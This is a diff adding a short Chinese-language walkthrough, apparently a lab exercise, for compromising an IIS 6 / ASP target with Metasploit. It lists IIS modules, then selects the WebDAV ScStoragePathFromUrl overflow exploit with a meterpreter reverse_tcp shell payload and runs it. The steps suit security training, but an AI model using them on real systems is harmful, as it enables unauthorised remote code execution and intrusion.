@@ -1,0 +1,23 @@
+<p>本次的靶机是 IIS 6,&#160; ASP</p>
+<p>所以使用了metasploit 进行提权</p>
+<p>1. 启动metasploit</p>
+<p>2. search iis&#160;</p>
+<pre>   20  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos                  2010-09-14       normal     No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
+   21  auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof                     2010-12-21       normal     No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
+   22  auxiliary/dos/windows/ftp/iis_list_exhaustion                    2009-09-03       normal     No     Microsoft IIS FTP Server LIST Stack Exhaustion
+   23  auxiliary/scanner/http/iis_internal_ip                                            normal     No     Microsoft IIS HTTP Internal IP Disclosure
+   24  exploit/windows/isapi/rsa_webagent_redirect                      2005-10-21       good       Yes    Microsoft IIS ISAPI RSA WebAgent Redirect Overflow
+   25  exploit/windows/isapi/w3who_query                                2004-12-06       good       Yes    Microsoft IIS ISAPI w3who.dll Query String Overflow
+   26  exploit/windows/iis/iis_webdav_upload_asp                        2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
+   27  exploit/windows/iis/iis_webdav_scstoragepathfromurl              2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+   28  auxiliary/scanner/http/iis_shortname_scanner                                      normal     Yes    Microsoft IIS shortname vulnerability scanner
+
+</pre>
+<p>3. use 27&#160;</p>
+<p>[*] Using configured payload windows/meterpreter/reverse_tcp<br />msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show payloads </p>
+<p>可以看到很多payloads.&#160;&#160;</p>
+<p>4. show options 查看各种选项。</p>
+<p>set RHOST xxx</p>
+<p>set RPORT xxx</p>
+<p>5. check&#160; 注意， check 不一定准确，而且check 不是必须函数，很多module都没有提供该方法</p>
+<p>6. run&#160;</p>
